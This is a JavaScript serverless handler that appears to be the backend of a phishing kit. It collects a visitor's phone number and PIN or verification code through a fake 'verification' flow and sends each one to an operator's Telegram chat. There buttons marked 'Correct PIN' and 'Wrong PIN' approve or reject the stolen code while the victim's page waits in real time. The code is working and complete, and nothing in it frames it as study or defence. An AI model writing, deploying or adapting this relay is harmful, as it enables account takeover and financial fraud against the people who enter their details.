import { Redis } from '@upstash/redis';

// Initialize Redis with a clear error if variables are missing
let redis;
try {
    const url = process.env.UPSTASH_REDIS_REST_URL || process.env.KV_REST_API_URL;
    const token = process.env.UPSTASH_REDIS_REST_TOKEN || process.env.KV_REST_API_TOKEN;
    
    if (!url || !token) {
        console.error("CRITICAL ERROR: Missing Redis Environment Variables!");
    } else {
        redis = new Redis({ url, token });
    }
} catch (error) {
    console.error("Redis initialization failed:", error);
}

export default async function handler(req, res) {
    // Enable CORS just in case
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

    // --- 1. FRONTEND POLLING (GET) ---
    if (req.method === 'GET') {
        try {
            const { userId } = req.query;
            if (!userId) return res.status(400).json({ error: 'Missing userId' });
            if (!redis) return res.status(500).json({ error: 'Database not connected' });
            
            const status = await redis.get(`status_${userId}`);
            return res.status(200).json({ status: status || 'pending' });
        } catch (error) {
            console.error("GET Error:", error);
            return res.status(500).json({ error: 'Database error' });
        }
    }

    // --- 2. TELEGRAM WEBHOOK (POST from Telegram Button Click) ---
    if (req.method === 'POST' && req.body && req.body.callback_query) {
        try {
            const { id, data, message } = req.body.callback_query;
            
            // Data looks like "approve_123456_pin" or "reject_123456_pin"
            console.log(`[TELEGRAM CLICK] Received data: ${data}`);
            const [action, userId, type] = data.split('_'); 

            if (!action || !userId || !type) {
                console.error("Invalid callback data format:", data);
                return res.status(200).send('Invalid data format'); // Return 200 so Telegram doesn't retry
            }

            // 1. Stop the loading spinner in Telegram
            await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: id })
            });

            // 2. Update the Database
            if (!redis) throw new Error("Redis not initialized");
            
            if (action === 'approve') {
                console.log(`[DATABASE] Setting status_${userId} to APPROVED`);
                await redis.set(`status_${userId}`, 'approved');
                await editTelegramMessage(message.message_id, `✅ PIN APPROVED - User can proceed`);
            } else if (action === 'reject') {
                console.log(`[DATABASE] Setting status_${userId} to REJECTED`);
                await redis.set(`status_${userId}`, 'rejected');
                await editTelegramMessage(message.message_id, `❌ WRONG ${type.toUpperCase()} - Rejected`);
            }
            
            return res.status(200).send('OK');
        } catch (error) {
            console.error("Telegram Webhook Error:", error);
            return res.status(500).send('Webhook Error');
        }
    }

    // --- 3. FRONTEND SUBMIT (POST from Website) ---
    if (req.method === 'POST' && req.body && req.body.action === 'send_verification') {
        try {
            const { phone, pin, userId, type } = req.body; 
            
            if (!redis) throw new Error("Redis not initialized");
            console.log(`[FRONTEND] Setting status_${userId} to PENDING`);
            await redis.set(`status_${userId}`, 'pending'); 

            const text = `# Thor - ${type.toUpperCase()} Verification\n` +
                         `${type.toUpperCase()} VERIFICATION NEEDED\n\n` +
                         `USER DETAILS:\n` +
                         `• Phone Number: ${phone}\n` +
                         `• ${type.toUpperCase()} Code: ${pin}\n` +
                         `• Username & Pass: user_${userId}\n` +
                         `• Time: ${new Date().toLocaleString()}\n` +
                         `• Bot: user75\n\n` +
                         `Verify the ${type.toUpperCase()}:\n` +
                         `• ${type.toUpperCase()} Length: ${pin.length} digits\n` +
                         `• Timeout: 5 minutes`;

            const tgRes = await fetch(`${TELEGRAM_API}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID,
                    text: text,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "✅ Correct PIN", callback_data: `approve_${userId}_${type}` }],
                            [{ text: "❌ Wrong PIN", callback_data: `reject_${userId}_${type}` }],
                            [{ text: "🕒 Extend Time", callback_data: `reject_${userId}_${type}` }]
                        ]
                    }
                })
            });

            if (!tgRes.ok) {
                const errText = await tgRes.text();
                console.error("Telegram API Error:", errText);
                throw new Error("Telegram failed to send message");
            }

            return res.status(200).json({ success: true });
        } catch (error) {
            console.error("Send Verification Error:", error);
            return res.status(500).json({ error: 'Failed to send' });
        }
    }

    return res.status(200).send('OK');
}

// Helper function to update the Telegram message
async function editTelegramMessage(messageId, text) {
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

    try {
        await fetch(`${TELEGRAM_API}/editMessageReplyMarkup`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                message_id: messageId,
                reply_markup: {
                    inline_keyboard: [[{ text: text, callback_data: "noop" }]]
                }
            })
        });
    } catch (e) {
        console.error("Failed to edit Telegram message:", e);
    }
}

// IMPORTANT: This tells Vercel to parse the incoming JSON body from Telegram automatically
export const config = {
    api: {
        bodyParser: true,
    },
};
